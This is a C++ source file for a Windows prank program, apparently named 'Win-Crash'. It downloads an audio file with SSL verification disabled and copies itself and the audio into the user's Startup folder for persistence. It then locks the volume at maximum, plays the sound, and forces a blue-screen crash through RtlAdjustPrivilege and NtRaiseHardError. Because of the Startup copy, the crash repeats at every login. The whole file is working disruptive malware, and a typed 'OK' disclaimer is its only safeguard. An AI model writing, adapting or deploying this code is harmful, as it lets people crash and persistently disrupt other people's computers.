#include <winsock2.h>
#include <windows.h>
#include <iostream>
#include <filesystem>
#include <curl/curl.h>
#include <Mmdeviceapi.h>
#include <Endpointvolume.h>
#include <future>
#pragma comment(lib, "ntdll.lib")

EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);

EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);

bool volEnable = true;

BOOL ChangeVolume(float nVolume)
{
    HRESULT hr = NULL;
    IMMDeviceEnumerator *deviceEnumerator = NULL;
    hr = CoCreateInstance(__uuidof(MMDeviceEnumerator), NULL, CLSCTX_INPROC_SERVER,
                          __uuidof(IMMDeviceEnumerator), (LPVOID *)&deviceEnumerator);
    if(FAILED(hr))
        return FALSE;

    IMMDevice *defaultDevice = NULL;
    hr = deviceEnumerator->GetDefaultAudioEndpoint(eRender, eConsole, &defaultDevice);
    deviceEnumerator->Release();
    if(FAILED(hr))
        return FALSE;

    IAudioEndpointVolume *endpointVolume = NULL;
    hr = defaultDevice->Activate(__uuidof(IAudioEndpointVolume),
                                 CLSCTX_INPROC_SERVER, NULL, (LPVOID *)&endpointVolume);
    defaultDevice->Release();
    if(FAILED(hr))
        return FALSE;

    hr = endpointVolume->SetMasterVolumeLevelScalar(nVolume, NULL);
    endpointVolume->SetMute(false, NULL);
    endpointVolume->Release();

    return SUCCEEDED(hr);
}

void changeVol() {
    while (volEnable) {
        	ChangeVolume(1.0);
	}
}

int main(void){
    FILE *fp;
    CURL *curl;
    fp = fopen("FX9eEhoRZhY.wav", "wb");
    curl_global_init(CURL_GLOBAL_ALL);
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, NULL);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, fp);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
        curl_easy_setopt(curl, CURLOPT_URL, "https://github.com/Crazypersonalph/Win-Crash/raw/audio-file/FX9eEhoRZhY.wav");
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, false);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, false);
        curl_easy_perform(curl);
        fclose(fp);
        curl_easy_cleanup(curl);
        curl_global_cleanup();
    }
   std::string x;
   std::cout << "This software is licensed under the MIT license" << std::endl;
   std::cout << "The author of this software does not claim liability for any damages caused by the program, as per set out in the license." << std::endl;
   std::cout << "For more information, go here: https://github.com/Crazypersonalph/Win-Crash/" << std::endl;
   std::cout << "This is your chance to exit out of the program.\nType in OK to continue.\nBy typing in OK, you are agreeing that the author of this program claims no liability for any damage caused by said program, as set forth in the MIT license." << std::endl;
   std::cin >> x;
   if (x != "OK"){

      abort();

   }
    CoInitialize(NULL);
    ChangeVolume(1.0);

     char * user = getenv("username");
     int counter = 15;
     std::string startup = "C:\\Users\\" + std::string(user) + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\";
     std::string filename = "main.exe";
     std::string sound = "FX9eEhoRZhY.wav";
     std::string final = startup + filename;
     std::string final1 = startup + sound;
     CopyFile(filename.c_str(), final.c_str(),true);
     CopyFile(sound.c_str(), final1.c_str(),true);
     PlaySoundA("FX9eEhoRZhY.wav", NULL, SND_ASYNC | SND_FILENAME);
     auto change = std::async(std::launch::async, changeVol);
     while (counter >= 1)
     {
        std::cout << "\rTime remaining: " << counter << std::endl;
        Sleep(1000);
        counter--;
     }

     BOOLEAN bl;
     RtlAdjustPrivilege(19, TRUE, FALSE, &bl);
     unsigned long response;
    CoUninitialize();
	volEnable = false;
	change.get();
     NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, 0, 6, &response);

     return 0;
}
